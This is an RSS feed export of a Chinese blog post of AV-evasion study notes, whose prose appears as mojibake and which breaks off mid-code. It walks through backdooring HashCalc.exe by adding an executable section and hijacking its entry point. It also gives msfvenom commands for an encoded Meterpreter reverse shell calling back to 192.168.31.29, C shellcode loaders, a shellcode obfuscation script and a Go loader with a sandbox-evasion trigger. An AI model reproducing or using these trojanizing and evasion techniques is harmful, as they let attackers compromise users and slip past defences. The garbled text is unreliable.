<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>å…æ€ on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/series/%E5%85%8D%E6%9D%80/</link><description>Recent content in å…æ€ on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 26 Apr 2022 23:42:54 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/series/%E5%85%8D%E6%9D%80/index.xml" rel="self" type="application/rss+xml"/><item><title>å…æ€å­¦ä¹ ç¬”è®°â… </title><link>https://amiaaaz.github.io/2022/04/26/bypass-av-study-notes-01/</link><pubDate>Tue, 26 Apr 2022 23:42:54 +0800</pubDate><guid>https://amiaaaz.github.io/2022/04/26/bypass-av-study-notes-01/</guid><description>&lt;h2 id="shellcodeæ³¨å…¥">shellcodeæ³¨å…¥&lt;/h2>
&lt;p>&lt;a href="https://github.com/NetSPI/PESecurity">PESecurity&lt;/a>å¯ä»¥æ£€æµ‹ç›®æ ‡å¯¹è±¡æ˜¯å¦å¼€å¯ASLRç­‰å®‰å…¨é€‰é¡¹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Import-Module&lt;/span> &lt;span style="color:#111">.\&lt;/span>&lt;span style="color:#111">Get-PESecurity&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">psm1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Get-PESecurity&lt;/span> &lt;span style="color:#f92672">-file&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#111">signle&lt;/span> &lt;span style="color:#111">file&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Get-PESecurity&lt;/span> &lt;span style="color:#111">-directory&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#111">directory&lt;/span> &lt;span style="color:#111">path&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">DLLs&lt;/span> &lt;span style="color:#111">&amp;amp;&lt;/span> &lt;span style="color:#111">EXEs&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407150555253.png" alt="image-20220407150555253">&lt;/p>
&lt;p>é€‰æ‹©ç›®æ ‡å¯¹è±¡çš„æ ‡å‡†ï¼š&lt;/p>
&lt;ul>
&lt;li>å¤§å°&amp;lt;10mbï¼Œåˆ©äºä¼ è¾“&lt;/li>
&lt;li>æœ¬èº«ä¸ºå¤§ä¼—æ–‡ä»¶ï¼Œä¾¿äºéšè”½&lt;/li>
&lt;li>ä¸å—ASLRæˆ–DEPç­‰å®‰å…¨åŠŸèƒ½çš„ä¿æŠ¤&lt;/li>
&lt;li>æœ€å¥½æœ¬èº«æœ‰ä½¿ç”¨ç½‘ç»œé€šä¿¡çš„åˆæ³•åŠŸèƒ½&lt;/li>
&lt;/ul>
&lt;p>è¿™é‡Œé€‰æ‹©çš„æ˜¯HashCalc.exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407152820447.png" alt="image-20220407152820447">&lt;/p>
&lt;ol>
&lt;li>é¦–å…ˆåœ¨åœ¨ä»£ç åŒºæ®µä¸­åˆ›å»ºæ–°çš„èŠ‚å¤´ï¼Œæˆ–åœ¨å†…å­˜ä¸­æ‰¾åˆ°åˆé€‚çš„ä½ç½®æ¤å…¥æˆ‘ä»¬çš„shellcode&lt;/li>
&lt;/ol>
&lt;p>ç”¨&lt;a href="https://down.52pojie.cn/Tools/PEtools/LordPE.7z">Lord PE&lt;/a>æ‰“å¼€ç›®æ ‡ç¨‹åºï¼Œå¹¶åœ¨åŒºæ®µè¡¨åº•éƒ¨æ·»åŠ æ–°æ®µ.ameï¼Œå¹¶å°†VSizeå’ŒRSizeéƒ½å¢åŠ 0x1000ï¼ˆ4096å­—èŠ‚ï¼‰ï¼Œå¹¶è®¾ç½®å¯è¯»å¯å†™å¯æ‰§è¡Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407153429603.png" alt="image-20220407153429603">&lt;/p>
&lt;p>æ­¤æ—¶ç›´æ¥è¿è¡Œä¼šå¤±è´¥ï¼Œå› ä¸ºæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ª1000hå­—èŠ‚çš„æ–°æ®µï¼Œä½†æ˜¯è¯¥åŒºæ®µä¸ºç©º&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407153503852.png" alt="image-20220407153503852">&lt;/p>
&lt;p>å…ˆç®€å•å¡«å……1000ä¸ª0x00çœ‹ç¨‹åºæ˜¯å¦æ­£å¸¸è¿è¡Œï¼Œè¿™é‡Œç”¨çš„æ˜¯&lt;a href="https://mh-nexus.de/downloads/HxDSetup.zip">HxD&lt;/a>ï¼ˆæ³¨æ„è¦å¡«å……åˆ°æ–‡ä»¶æœ«å°¾ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407154451061.png" alt="image-20220407154451061">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407155458815.png" alt="image-20220407155458815">&lt;/p>
&lt;p>å¯ä»¥æ­£å¸¸è¿è¡Œ&lt;/p>
&lt;ol start="2">
&lt;li>åŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹&lt;/li>
&lt;/ol>
&lt;p>é¦–å…ˆåœ¨&lt;a href="https://down.52pojie.cn/Tools/Debuggers/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E4%B8%93%E7%94%A8%E7%89%88Ollydbg.rar">Ollydbg&lt;/a>ä¸­è½¬åˆ°å†…å­˜éƒ¨åˆ†ï¼ˆalt+Mï¼‰ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ–°åŠ çš„.ameï¼Œå¹¶ä¸”æœ‰RWEæƒé™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407160456405.png" alt="image-20220407160456405">&lt;/p>
&lt;p>æ¥ä¸‹æ¥æˆ‘ä»¬è¦å°†ç¨‹åºçš„æ‰§è¡ŒæµåŠ«æŒåˆ°æˆ‘ä»¬æ–°æ·»åŠ çš„.ameæ®µä¸­ï¼Œä½¿æœ€ç»ˆæ‰§è¡Œç¨‹åºæ—¶è¿›å…¥æ”¾æœ‰shellcodeçš„.ameéƒ¨åˆ†&lt;/p>
&lt;p>é¦–å…ˆå¤åˆ¶å‰3ä¸ªæ“ä½œç ï¼ˆä¹‹åå›å¤æ‰§è¡Œæµç¨‹æ—¶éœ€è¦ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407164119652.png" alt="image-20220407164119652">&lt;/p>
&lt;p>æˆ‘ä»¬å¤åˆ¶.ameçš„èµ·å§‹åœ°å€00482000ï¼Œå¹¶æŠŠç¨‹åºå…¥å£å¤„çš„&lt;code>push ebp&lt;/code>æ”¹ä¸º&lt;code>jmp 00482000&lt;/code>å¹¶ä¿å­˜ä¸ºæ–°çš„exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407165720185.png" alt="image-20220407165720185">&lt;/p>
&lt;p>å†æ¬¡è¿è¡Œæ—¶å°±å·²ç»ä¸ä¼šå±•ç¤ºæ­£å¸¸çš„é¡µé¢äº†&lt;/p>
&lt;ol start="3">
&lt;li>å¡«å……msfğŸ&lt;/li>
&lt;/ol>
&lt;p>è¿™é‡Œç”¨messageboxåšå¡«å……&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/messagebox &lt;span style="color:#111">text&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;it&amp;#39;s demo&amp;#34;&lt;/span> -f hex
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨&lt;code>jmp 00482000&lt;/code>å¤„enterè·Ÿéšè·³è½¬ï¼ŒæŠŠpayloadå¤åˆ¶åˆ°nullçš„éƒ¨åˆ†ï¼Œä¿å­˜ä¸ºæ–°çš„exe&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407170518230.png" alt="image-20220407170518230">&lt;/p>
&lt;p>æˆåŠŸè¿è¡Œ&lt;/p>
&lt;ol start="4">
&lt;li>å›å¤ç¨‹åºçš„æ­£å¸¸æ‰§è¡Œæµç¨‹&lt;/li>
&lt;/ol>
&lt;p>é¦–å…ˆå°†shellcodeæœ€åä¸€å¥è·³è½¬æ”¹ä¸ºnopï¼Œä½¿ç”¨&lt;code>popfd&lt;/code>å’Œ&lt;code>popod&lt;/code>å›å¤å †æ ˆæ“ä½œï¼Œç„¶åå°†åŸç¨‹åºèµ·å§‹ä½ç½®çš„æ±‡ç¼–ç å¤åˆ¶åˆ°è¿™é‡Œï¼Œæœ€åè·³è½¬å›åŸæ¥çš„æ‰§è¡Œåœ°å€&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220407180451897.png" alt="image-20220407180451897">&lt;/p>
&lt;p>å°±å¯ä»¥åœ¨å¼¹messageboxä¹‹åç»§ç»­HashCalcåŸç¨‹åºäº†&lt;/p>
&lt;p>åŒç†ï¼Œæˆ‘ä»¬å¯ä»¥æ’å…¥msfğŸ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i &lt;span style="color:#ae81ff">4&lt;/span> -b &lt;span style="color:#d88200">&amp;#39;\x00&amp;#39;&lt;/span> &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4788&lt;/span> -f hex
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„æ­¤å¤„é€‰ç”¨&lt;code>x86/shikata_ga_nai&lt;/code>çš„encoderä¹‹åå‰é¢å°±ä¸èƒ½ç”¨x64äº†ï¼Œé»˜è®¤ç”Ÿæˆçš„éƒ½æ˜¯x86çš„payloadï¼Œå¹¶ä¸”è¦æ³¨æ„&lt;code>-i&lt;/code>å‚æ•°çš„æŒ‡å®šï¼Œè¦ä¸å‰é¢æ‰©å……çš„æ–°æ®µå¤§å°ç›¸åŒ¹é…&lt;/p>
&lt;h2 id="shellcodeåŠ è½½å™¨">shellcodeåŠ è½½å™¨&lt;/h2>
&lt;blockquote>
&lt;/blockquote>
&lt;p>æ ¹æ®å‰é¢å¯¹ğŸç»“æ„çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“å•ä¸€çš„shellcodeæ˜¯æ— æ³•æ‰§è¡Œçš„ï¼Œéœ€è¦é…å¥—çš„shellcode loaderæ¥æ¥æ”¶åç»­çš„stagerï¼Œç¼–å†™çš„æ€è·¯éƒ½æ˜¯å¤§å·®ä¸å·®çš„ï¼Œä»¥åŠ¨æ€åŠ è½½å†…å­˜ä¸ºä¾‹ï¼š&lt;/p>
&lt;ol>
&lt;li>æ¥æ”¶4å­—èŠ‚ç¼“å†²åŒºå¤§å°&lt;/li>
&lt;li>å¼€è¾Ÿå†…å­˜&lt;/li>
&lt;li>å°†socketä¸­çš„å€¼å¤åˆ¶åˆ°ç¼“å†²åŒºä¸­å»&lt;/li>
&lt;li>è¯»å–å­—èŠ‚åˆ°ç¼“å†²åŒº&lt;/li>
&lt;li>æ‰§è¡Œsyscall&lt;/li>
&lt;li>é€€å‡º&lt;/li>
&lt;/ol>
&lt;p>è¿™æ˜¯æœ€æœ€æœ€åŸºç¡€çš„loaderï¼Œå½“è€ƒè™‘åˆ°å…æ€æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ä¸åŒçš„è¯­è¨€æ¥ç¼–è¯‘exeï¼ˆæ¯”å¦‚python, goç­‰ï¼‰ã€æ¶ˆé™¤ä»£ç ä¸­çš„æ˜æ˜¾ç‰¹å¾ï¼Œæˆ–æ˜¯ä¸ºæ¥æ”¶payloadè¿™ä¸€è¡Œä¸ºå‰åŠ ä¸Šæ²™ç›’ä¸­æ— æ³•å®ç°çš„æ¡ä»¶æ¥bypass&lt;/p>
&lt;p>ä¸‹é¢ä»¥cçš„ç‰ˆæœ¬åšä¸»è¦çš„ç¤ºä¾‹ï¼šï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># äº²æµ‹è¿™ä¸ªencoderå®Œå…¨ä¸èƒ½ç”¨åˆ°windows/x64/xxxä¸Š ä¹‹åç¼–è¯‘exeä¹Ÿå¾—ç”¨`gcc -m32 x.c -o x.exe` å¿…é¡»é…å¥—32ä½&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># è¿™æ ·äº§ç”Ÿçš„shellcodeæœ¬ä½“å¯ä»¥åšåˆ°åŸºæœ¬å…æ€ åç»­çš„æ“ä½œåŸºäºå¦‚ä½•å…æ€åŠ è½½&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i &lt;span style="color:#ae81ff">4&lt;/span> -b &lt;span style="color:#d88200">&amp;#39;\x00&amp;#39;&lt;/span> &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">4788&lt;/span> -f c -o t1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="c">C&lt;/h3>
&lt;h4 id="ä¸è€ƒè™‘loaderçš„è£¸æ‰§è¡Œå¿…è¢«æ€">ä¸è€ƒè™‘loaderçš„è£¸æ‰§è¡Œï¼ˆå¿…è¢«æ€&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">unsigned&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">[]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ç”³è¯·åŠ¨æ€å†…å­˜åŠ è½½">ç”³è¯·åŠ¨æ€å†…å­˜åŠ è½½&lt;/h4>
&lt;p>é€šå¸¸ä¼šè°ƒç”¨kernel32çš„win apiï¼Œå¸¸è§å‡½æ•°å’Œå®ƒä»¬çš„ä½œç”¨ï¼ˆä»¥cä¸ºä¾‹ï¼‰&lt;/p>
&lt;pre tabindex="0">&lt;code>malloc: åˆ†é…å†…å­˜
VirtualAlloc: ç”³è¯·ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŠ¨æ€å†…å­˜åŒºåŸŸ
memcpy: ä»æŒ‡å®šå†…å­˜ä¸­å¤åˆ¶å†…å®¹è‡³å¦ä¸€å†…å­˜é‡Œ
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LPVOID&lt;/span> &lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Memory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">VirtualAlloc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">sizeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">MEM_COMMIT&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#111">MEM_RESERVE&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">PAGE_EXECUTE_READWRITE&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// å†…å­˜åœ°å€, å¤§å°, åˆ†é…ç±»å‹, è¯¥å†…å­˜çš„åˆå§‹ä¿æŠ¤å±æ€§
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">memcpy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">sizeof&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">)())&lt;/span>&lt;span style="color:#111">Memory&lt;/span>&lt;span style="color:#111">)();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="å†…è”æ±‡ç¼–æŒ‡ä»¤">å†…è”æ±‡ç¼–æŒ‡ä»¤&lt;/h4>
&lt;p>*æ³¨æ„gccçš„å†…è”æ±‡ç¼–ä¸vcçš„ä¸åŒ ä½¿ç”¨AT&amp;amp;Tè¯­æ³•ï¼Œè¯·å‚ç…§&lt;a href="https://www.jianshu.com/p/1782e14a0766">GCCå†…è”æ±‡ç¼–åŸºç¡€&lt;/a>&lt;/p>
&lt;h3 id="go">Go&lt;/h3>
&lt;p>é€šè¿‡&lt;code>syscall&lt;/code>å¯ä»¥ä¸æ»‘åœ°è°ƒç”¨kernel32.dllçš„å‡½æ•°&lt;/p>
&lt;h4 id="æ¡ä»¶è§¦å‘">æ¡ä»¶è§¦å‘&lt;/h4>
&lt;p>é¦–å…ˆå¯¹shellcodeè¿›è¡Œç®€æ˜“æ··æ·†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># https://github.com/pureqh/bypassAV/blob/main/go_shellcode_encode.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">buf1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;shellcode&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">buf1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">b64shellcode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">b64shellcode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;A&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;#&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;H&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;@&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;T&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">b64shellcode&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é‡Œæ¡ä»¶è§¦å‘ï¼ŒæŒ‡çš„æ˜¯åœ¨æœ€åæŒ‡ä»¤æ‰§è¡Œå‰ å…ˆè®¿é—®ä¸€æ¬¡å±€åŸŸç½‘å†…å­˜åœ¨è€Œæ²™ç®±å†…ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œè¾¾åˆ°bypassæ²™ç®±çš„æ•ˆæœ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// https://github.com/pureqh/bypassAV/blob/main/main.go
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;encoding/base64&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/url&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;syscall&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;unsafe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">kernel32&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">syscall&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewLazyDLL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kernel32.dll&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">VirtualAlloc&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">kernel32&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewProc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;VirtualAlloc&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">RtlMoveMemory&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">kernel32&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewProc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;RtlMoveMemory&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ddm&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
